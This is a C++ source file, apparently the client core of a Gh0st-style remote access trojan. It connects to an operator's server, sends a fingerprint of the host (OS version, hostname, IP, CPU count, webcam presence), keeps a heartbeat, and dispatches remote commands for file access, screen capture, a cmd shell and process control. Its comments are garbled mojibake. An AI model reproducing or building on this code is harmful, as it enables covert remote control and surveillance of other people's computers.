#include "stdafx.h"
#include "MainCommand.h"
#include "ClientSocket.h"
#include "../Common/DataStruct.h"
#include "ShellCommand.h"
#include "FileCommand.h"
#include "ScreenCommand.h"
#include "ProcessCommand.h"

#include <Vfw.h>
#include <VersionHelpers.h>

#pragma comment(lib,"Vfw32.lib")

CMainCommand::CMainCommand(char* szIP, int nPort,bool* IsRun)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_IsRun = IsRun;
    m_ClientSocket.SetComand(this);
    m_hEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
    m_dwLastTime = 0;
    m_HeratThread = INVALID_HANDLE_VALUE;
}

CMainCommand::~CMainCommand()
{
    OutputDebugStringA("Log:~CMainCommand");
    if (m_HeratThread != INVALID_HANDLE_VALUE)
    {
        CloseHandle(m_HeratThread);
        m_HeratThread = INVALID_HANDLE_VALUE;
    }
    CloseHandle(m_hEvent);
}

void CMainCommand::OnRecv(char*  pBuffer, int nSize)
{
    switch (pBuffer[0])
    {
    case COMMAND_DIR:           //�ļ�
    {
        IMyCommand* pFileCommand = new CFileCommand(m_szIp, m_nPort);
        m_ClientThreadPool.PostAddCmd(pFileCommand); //Ͷ�ݵ�����
        break;
    }
    case COMMAND_Screen:        //��Ļ
    {
        IMyCommand* pScreenCommand = new CScreenCommand(m_szIp, m_nPort);
        m_ClientThreadPool.PostAddCmd(pScreenCommand); //Ͷ�ݵ�����
        break;
    }
    case COMMAND_CMD:           //cmd
    {
        IMyCommand* pShellCommand = new CShellCommand(m_szIp, m_nPort); //������Ӧ����Ϣ�������
        m_ClientThreadPool.PostAddCmd(pShellCommand); //Ͷ�ݵ�����
        break;
    }
    case COMMAND_PROCESS:       //����
    {
        IMyCommand* pProcessCommand = new CProcessCommand(m_szIp, m_nPort); //������Ӧ����Ϣ�������
        m_ClientThreadPool.PostAddCmd(pProcessCommand); //Ͷ�ݵ�����
        break;
    }
    case COMMAND_HEARTBEAT:       //����
    {
        m_dwLastTime = GetTickCount() / 1000;
        Dbgprintf("�յ�����");
        break;
    }
    case COMMAND_Stop:
    {
        *m_IsRun = true;
        m_ClientSocket.OnClose();
        break;
    }
    }
}

void CMainCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}

void CMainCommand::OnClose()
{
    SetEvent(m_hEvent);
}

unsigned __stdcall CMainCommand::HeratProc(LPVOID lpParam)
{
    CMainCommand* pThis = (CMainCommand*)lpParam;
    char Type = COMMAND_HEARTBEAT;
    DWORD LastTime = 0;
    
    while (true)
    {
        Sleep(500);//��˯��CPU ��
        DWORD CurrTime = GetTickCount() / 1000;
        //�ȼ�Ȿ�س�ʱû
        DWORD chazhi = CurrTime - pThis->m_dwLastTime;
        if (chazhi > timeout)
        {
            //��ʱ���˳�
            Dbgprintf("������ʱ%d", chazhi);
            return false;
        }
        //���10�뷢��һ������
        if (CurrTime - LastTime > 10)
        {
            pThis->OnSend(&Type, sizeof(char));
            LastTime = GetTickCount() / 1000;
        }
    }
    return true;
}


void CMainCommand::Execute()
{
    DWORD m_dwTickCount = GetTickCount();
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        return;
    }
    m_dwSpeed = GetTickCount() - m_dwTickCount;
    //���͵�¼��Ϣ
    SendLoginMessage();
    m_dwLastTime = GetTickCount() / 1000;
    //�������߳�
    m_HeratThread = (HANDLE)_beginthreadex(NULL, 0, HeratProc, this, 0, NULL);
    if (m_HeratThread == INVALID_HANDLE_VALUE)
    {
        return;
    }
    WaitForSingleObject(m_hEvent, INFINITE);
    OutputDebugStringA("Log:CMainCommand::Execute()ִ�����");
}


bool IsWebCam()
{
    bool	bRet = false;
    TCHAR	lpszName[100], lpszVer[50];
    for (int i = 0; i < 10 && !bRet; i++)
    {
        bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
            lpszVer, sizeof(lpszVer));
    }
    return bRet;
}

void CMainCommand::SendLoginMessage()
{
    int nRet = SOCKET_ERROR;
    LOGININFO	LoginInfo;
    // ��ʼ��������
    // ��¼��Ϣ
    LoginInfo.bToken = TOKEN_LOGIN;
    //����ͷ
    LoginInfo.bIsWebCam = 0;

    //����ϵͳ
    memset(LoginInfo.szOSver, 0, sizeof(LoginInfo.szOSver));
    char *pszOS = NULL;
    if (IsWindowsServer())
    {
        pszOS = "Windows Server release";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows8Point1OrGreater())
    {
        pszOS = "Windows 8.1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows8OrGreater())
    {
        pszOS = "Windows 8";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows7SP1OrGreater())
    {
        pszOS = "Windows 7 with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows7OrGreater())
    {
        pszOS = "Windows 7";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaSP2OrGreater())
    {
        pszOS = "Windows Vista with SP2";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaSP1OrGreater())
    {
        pszOS = "Windows Vista with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaOrGreater())
    {
        pszOS = "Windows Vista";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP3OrGreater())
    {
        pszOS = "Windows XP with SP3";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP2OrGreater())
    {
        pszOS = "Windows XP with SP2";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP1OrGreater())
    {
        pszOS = "Windows XP with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPOrGreater())
    {
        pszOS = "Windows XP";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }

    // ������
    char hostname[256] = { 0 };
    gethostname(hostname, 256);
    memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
    // IP��Ϣ
    sockaddr_in  sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));
    int nSockAddrLen = sizeof(sockAddr);
    getsockname(m_ClientSocket.m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

    char* pSzIP = inet_ntoa(sockAddr.sin_addr);
    memset(LoginInfo.szIP, 0, sizeof(LoginInfo.szIP));
    memcpy(LoginInfo.szIP, pSzIP, strlen(pSzIP));

    //��ȡCPU������
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    LoginInfo.CPUClockMhz = systemInfo.dwNumberOfProcessors;

    //����ͷ
    LoginInfo.bIsWebCam = IsWebCam();

    // Speed
    LoginInfo.dwSpeed = m_dwSpeed;

    OnSend((char*)&LoginInfo, sizeof(LOGININFO));
}

